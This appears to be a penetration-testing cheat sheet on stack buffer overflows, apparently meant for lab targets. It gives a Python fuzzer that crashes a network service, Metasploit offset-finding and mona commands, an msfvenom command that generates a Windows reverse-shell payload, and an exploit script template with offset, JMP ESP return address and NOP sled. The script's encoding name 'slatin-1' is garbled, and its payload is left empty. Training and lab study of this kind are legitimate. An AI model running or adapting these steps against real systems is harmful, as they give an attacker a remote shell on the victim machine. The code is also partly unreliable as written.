# Buffer Overflow

## Fuzzer

{% embed url="https://github.com/AceSineX/BOF-fuzzer-python-3-All-in" %}

```python
#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100
prefix = ""
while True:
 try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.183.130',9999))

	payload = prefix + buffer

	s.send((payload.encode()))
	s.close()
	sleep(1)
	buffer = buffer + "A"*100

 except:
	print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
```

## Steps

1. Fuzz and crash program w/ A's
2. Create msfpattern
   * `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`
3. Provide EIP to find offset
   * `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q (EIP value)`
4. Check for bad characters
5. Find JMP ESP/Return Address
   * make sure protection schemes are off and base address doesn't contain bad chars
6. Generate Shellcode
   * `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00"`
7. Exploit!

## Mona commands

```
!mona config -set workingfolder c:\mona\%p 
!mona bytearray -cpb "\x00"
!mona compare -f c:\mona\nameOfProgram\bytearray.bin -a ESP Address
!mona jmp -r ESP -m "module"
```

## Exploit.py

```python
import socket

ip = "MACHINE IP"
port = 9999


prefix = ""
offset = 2306
overflow = "A" * offset
retn = "\x0d\x11\x20\x11" # JMP ESP 1120110d
padding = "\x90" * 16 # nops
payload = ()
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "slatin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
